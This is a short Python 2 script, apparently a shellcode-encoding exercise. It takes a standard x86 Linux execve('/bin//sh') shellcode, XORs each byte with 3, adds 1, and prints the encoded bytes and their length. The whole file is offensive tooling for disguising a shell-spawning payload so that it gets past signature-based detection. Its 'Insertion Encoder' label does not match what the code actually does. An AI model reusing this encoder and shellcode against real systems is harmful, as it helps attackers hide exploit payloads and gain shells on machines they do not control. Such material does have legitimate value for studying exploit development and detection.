#!/usr/bin/python

# Python Insertion Encoder 
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""

for x in bytearray(shellcode) :
        c = hex(x ^ 3)
        d = int(c, 16)
        e = d + 1
        encoded += '0x'
        encoded += '%02x,' %e

print encoded

print 'Len: %d' % len(bytearray(shellcode))
